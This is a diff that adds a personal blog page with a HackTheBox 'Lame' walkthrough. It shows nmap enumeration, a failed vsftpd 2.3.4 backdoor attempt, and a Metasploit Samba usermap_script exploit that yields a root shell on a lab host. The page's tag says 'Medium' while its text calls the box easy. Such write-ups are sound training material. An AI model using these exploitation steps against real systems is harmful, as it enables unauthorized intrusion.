@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+
+<!--
+  portfolYOU Jekyll theme by yousinix
+  Free for personal and commercial use under the MIT license
+  https://github.com/yousinix/portfolYOU
+-->
+
+<html lang="en" class="h-100">
+
+<head>
+
+  
+  
+  
+
+  
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Lame">
+  <meta property="og:description" content="HackTheBox - Medium">
+  <meta property="og:image" content="/assets/img/profile.png">
+
+  <title>Lame</title>
+  <meta name="description" content="HackTheBox - Medium">
+
+  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">
+
+  <!-- Theme style -->
+  <script src="/assets/js/theme.js"></script>
+
+  <!-- Font Awesome CDN -->
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css">
+
+  <!-- Bootstrap CSS CDN -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
+
+  <!-- Animate CSS CDN -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.css">
+
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="/assets/css/style.css">
+
+</head>
+
+
+<body class="h-100 d-flex flex-column">
+
+  <main class="flex-shrink-0 container mt-5">
+    <nav class="navbar navbar-expand-lg navbar-themed">
+
+  <a class="navbar-brand" href="/"><h5><b>Akshay Chavan</b></h5></a>
+
+  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+    <i class="fas fa-1x fa-bars text-themed"></i>
+  </button>
+
+  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
+    <div class="navbar-nav ml-auto">
+<a class="nav-item nav-link " href="/projects/">Projects</a>
+
+      <a class="nav-item nav-link active" href="/blog/">Blog</a>
+
+      <a class="nav-item nav-link " href="/about/">About</a>
+
+      
+
+      <span id="theme-toggler" class="nav-item nav-link" role="button" onclick="toggleTheme()"></span>
+    </div>
+  </div>
+
+</nav>
+    <div class="col-lg-10 mx-auto mt-5 markdown-body">
+  <h1><b>Lame</b></h1>
+
+<p class="post-metadata text-muted">
+  02 September 2023 -  
+  <b>3 mins read time</b>
+
+  <br>Tags: 
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#sambausermap">
+      <span class="tag badge badge-pill text-primary border border-primary">SambaUsermap</span>
+    </a>
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#rootcompromise">
+      <span class="tag badge badge-pill text-primary border border-primary">RootCompromise</span>
+    </a>
+    </p>
+
+<p><img src="/assets/ctf/htb_media/lame_infocard.png" alt="infocard"></p>
+
+<h2 id="introduction">Introduction</h2>
+
+<p>Lame is an easy machine on HackTheBox and one of the earliest boxes available on the platform. It involves exploiting vulnerabilities in the FTP and SMB services to gain root access. This walkthrough will guide you through the process of compromising the Lame machine, from initial reconnaissance to gaining root access.</p>
+
+<h2 id="initial-enumeration">Initial Enumeration</h2>
+
+<h3 id="nmap-scan">Nmap Scan</h3>
+
+<p>The first step in any penetration test is enumeration. We start by scanning the target machine using Nmap to identify open ports and services.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p-</span> 10.10.10.3 <span class="o">&gt;</span> nmap/service.log
+</code></pre></div></div>
+
+<p><strong>Nmap Results:</strong></p>
+
+<pre><code class="language-nmap">Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-30 02:48 EST
+Nmap scan report for 10.10.10.3
+Host is up (0.36s latency).
+
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.7
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 2h31m25s, deviation: 3h32m08s, median: 1m24s
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   Computer name: lame
+|   NetBIOS computer name: 
+|   Domain name: hackthebox.gr
+|   FQDN: lame.hackthebox.gr
+|_  System time: 2020-11-30T02:50:16-05:00
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 54.11 seconds
+</code></pre>
+
+<p><strong>Key Services Identified:</strong></p>
+
+<ul>
+  <li>
+<strong>FTP (21):</strong> vsftpd 2.3.4</li>
+  <li>
+<strong>SSH (22):</strong> OpenSSH 4.7p1</li>
+  <li>
+<strong>SMB (139, 445):</strong> Samba smbd 3.0.20-Debian</li>
+</ul>
+
+<h2 id="exploiting-ftp">Exploiting FTP</h2>
+
+<h3 id="identifying-the-vulnerability">Identifying the Vulnerability</h3>
+
+<p>The Nmap scan revealed that the FTP service is running vsftpd 2.3.4, which is known to have a backdoor command execution vulnerability.</p>
+
+<p><strong>Exploit Search:</strong></p>
+
+<p><img src="/assets/ctf/htb_media/lame_ftpexploit.png" alt="FTP Exploit"></p>
+
+<h3 id="attempting-the-exploit">Attempting the Exploit</h3>
+
+<p>We used the Metasploit module <code class="language-plaintext highlighter-rouge">exploit/unix/ftp/vsftpd_234_backdoor</code> to attempt to exploit the vulnerability.</p>
+
+<p><strong>Metasploit Module Execution:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 exploit<span class="o">(</span>unix/ftp/vsftpd_234_backdoor<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS 10.10.10.3
+msf6 exploit<span class="o">(</span>unix/ftp/vsftpd_234_backdoor<span class="o">)</span> <span class="o">&gt;</span> exploit
+</code></pre></div></div>
+
+<p><strong>Exploit Failure:</strong></p>
+
+<p><img src="/assets/ctf/htb_media/lame_ftpfail.png" alt="FTP Exploit Failed"></p>
+
+<p>The exploit failed, so we moved on to the next service.</p>
+
+<h2 id="exploiting-smb">Exploiting SMB</h2>
+
+<h3 id="enumerating-smb-shares">Enumerating SMB Shares</h3>
+
+<p>We enumerated the SMB shares using <code class="language-plaintext highlighter-rouge">smbclient</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-L</span> //10.10.10.3
+</code></pre></div></div>
+
+<p><strong>SMB Shares:</strong></p>
+
+<p><img src="/assets/ctf/htb_media/lame_smbshare.png" alt="SMB Shares"></p>
+
+<p>We identified two shares: <code class="language-plaintext highlighter-rouge">/tmp</code> and <code class="language-plaintext highlighter-rouge">/opt</code>. Accessing <code class="language-plaintext highlighter-rouge">/opt</code> required a password, but <code class="language-plaintext highlighter-rouge">/tmp</code> was accessible.</p>
+
+<h3 id="identifying-the-vulnerability-1">Identifying the Vulnerability</h3>
+
+<p>The Samba service is running version 3.0.20-Debian, which is vulnerable to a username map script vulnerability.</p>
+
+<p><strong>Exploit Search:</strong></p>
+
+<p>We found an exploit for this vulnerability on Exploit-DB: <a href="https://www.exploit-db.com/exploits/16320">usermap exploit</a>.</p>
+
+<h3 id="exploiting-the-vulnerability">Exploiting the Vulnerability</h3>
+
+<p>We used the Metasploit module <code class="language-plaintext highlighter-rouge">exploit/multi/samba/usermap_script</code> to exploit the vulnerability.</p>
+
+<p><strong>Metasploit Module Execution:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> use exploit/multi/samba/usermap_script
+msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS 10.10.10.3
+msf6 exploit<span class="o">(</span>multi/samba/usermap_script<span class="o">)</span> <span class="o">&gt;</span> exploit
+</code></pre></div></div>
+
+<p><strong>Root Shell Obtained:</strong></p>
+
+<p><img src="/assets/ctf/htb_media/lame_rootshell.png" alt="Root Shell"></p>
+
+<h3 id="understanding-the-exploit">Understanding the Exploit</h3>
+
+<p>The exploit works by sending a username with shell meta-characters to the Samba service, which allows arbitrary command execution. By crafting a payload with a reverse shell, we gained root access.</p>
+
+<p><strong>Exploit Code Analysis:</strong></p>
+
+<p><img src="/assets/ctf/htb_media/lame_exworking.png" alt="Exploit Working"></p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>The Lame machine on HackTheBox provided a comprehensive challenge, encompassing service enumeration, FTP and SMB exploitation. By methodically enumerating services and exploiting discovered vulnerabilities, we successfully compromised the machine and gained root access. This walkthrough underscores the importance of thorough enumeration and the effective use of discovered vulnerabilities in penetration testing.</p>
+
+
+
+
+</div>
+  </main>
+  <footer class="mt-auto py-3 text-center">
+
+  <small class="text-muted mb-2">
+    <i class="fas fa-code"></i> with <i class="fas fa-heart"></i>
+    by <strong>Akshay Chavan</strong>
+  </small>
+
+  <div class="container-fluid justify-content-center">
+<a class="social mx-1" href="mailto:akschavan100@gmail.com" style="color: #6c757d" onmouseover="this.style.color='#db4437'" onmouseout="this.style.color='#6c757d'">
+      <i class="fas fa-envelope fa-1x"></i>
+    </a><a class="social mx-1" href="https://www.github.com/akshaychavan10" style="color: #6c757d" onmouseover="this.style.color='#333333'" onmouseout="this.style.color='#6c757d'">
+      <i class="fab fa-github fa-1x"></i>
+    </a><a class="social mx-1" href="https://www.linkedin.com/in/akshaychavan07" style="color: #6c757d" onmouseover="this.style.color='#007bb5'" onmouseout="this.style.color='#6c757d'">
+      <i class="fab fa-linkedin-in fa-1x"></i>
+    </a>
+
+</div>
+<small id="attribution">
+    theme <a href="https://github.com/yousinix/portfolYOU">portfolYOU</a>
+  </small>
+
+</footer>
+
+  
+  <!-- GitHub Buttons -->
+<script async defer src="https://buttons.github.io/buttons.js"></script>
+
+<!-- jQuery CDN -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<!-- Popper.js CDN -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>
+
+<!-- Bootstrap JS CDN -->
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+
+<!-- wow.js CDN & Activation -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.js"></script>
+<script> new WOW().init(); </script>
+
+<!-- Initialize all tooltips -->
+<script>
+$(function () {
+    $('[data-toggle="tooltip"]').tooltip()
+})
+</script>
+</body>
+
+</html>
